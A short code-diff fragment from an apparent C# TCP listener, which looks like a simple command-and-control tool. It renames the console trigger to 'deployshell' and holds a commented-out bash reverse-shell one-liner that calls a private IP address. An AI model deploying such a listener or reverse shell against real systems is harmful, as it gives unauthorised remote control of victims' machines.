@@ -120,8 +120,10 @@ namespace tcp_listener
                         while (client.Connected)
                         {
                             //Byte[] newbytes = new Byte[256];
+                            //streamWriter = new StreamWriter(stream);
+
                             string text = Console.ReadLine();
-                            if (text == "linux")
+                            if (text == "deployshell")
                             {
                                 //string payload = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
                                 string te = "ls";
